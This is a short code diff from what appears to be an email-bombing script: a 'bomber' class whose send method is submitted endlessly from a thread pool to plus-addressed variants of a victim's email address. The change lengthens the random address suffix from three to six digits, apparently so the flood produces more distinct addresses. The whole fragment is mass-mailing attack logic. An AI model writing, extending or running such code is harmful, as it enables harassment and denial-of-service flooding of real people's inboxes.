@@ -108,4 +108,4 @@ class bomber:
 with ThreadPoolExecutor() as ex:
     for _ in range(threads):
         while True:
-            ex.submit(bomber().send, f'{epart1}+{''.join(str(random.randint(0, 9)) for _ in range(3))}@{epart2}')
+            ex.submit(bomber().send, f'{epart1}+{''.join(str(random.randint(0, 9)) for _ in range(6))}@{epart2}')
